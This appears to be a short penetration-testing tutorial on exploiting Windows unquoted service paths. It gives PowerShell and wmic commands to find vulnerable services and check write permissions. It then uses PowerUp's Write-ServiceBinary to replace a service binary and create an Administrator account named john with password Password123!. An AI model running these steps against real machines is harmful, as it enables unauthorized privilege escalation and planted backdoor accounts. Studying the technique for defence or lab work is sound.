When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is). In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument.

We find unquoted paths with the command

```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

We must check if we have write permissions on the executable in order to replace it with a new one.

```powershell
icacls "C:\Program Files\Enterprise Apps\path\to\service.exe"
```

Then if we have permission on the service we can start or stop it with `Start-Service` or `Stop-Service` command. Once we got the paths we can use PowerUp.ps1 for exploiting the service. This means the service will be replaced with a malicious exe.

```powershell
Get-UnquotedService
powershell -ep bypass
. .\PowerUp.ps1
```

And finally we run the command to overwrite the service with

```powershell
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```

Now restarting the service will grant us an Administrator account with user john and Password123! as credentials

```powershell
Restart-Service GammaService
```